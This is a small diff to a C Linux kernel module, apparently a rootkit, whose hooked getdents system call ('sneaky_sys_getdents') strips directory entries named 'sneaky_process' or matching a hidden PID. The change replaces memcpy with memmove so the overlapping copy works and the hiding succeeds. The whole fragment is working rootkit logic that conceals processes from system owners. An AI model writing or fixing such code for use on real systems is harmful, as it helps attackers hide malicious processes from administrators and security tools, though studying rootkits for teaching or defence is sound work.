@@ -84,7 +84,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
     if ((strcmp(d->d_name, "sneaky_process") == 0) ||
         (strcmp(d->d_name, sneaky_pid) == 0)) {
       printk(KERN_INFO "find sneaky_process or sneaky_pid");
-      memcpy((char*)dirp + bpos, (char*)dirp + bpos+ d->d_reclen, nread - (bpos + d->d_reclen));
+      memmove((char*)dirp + bpos, (char*)dirp + bpos+ d->d_reclen, nread - (bpos + d->d_reclen));
       nread -= d->d_reclen;
     }
     else {
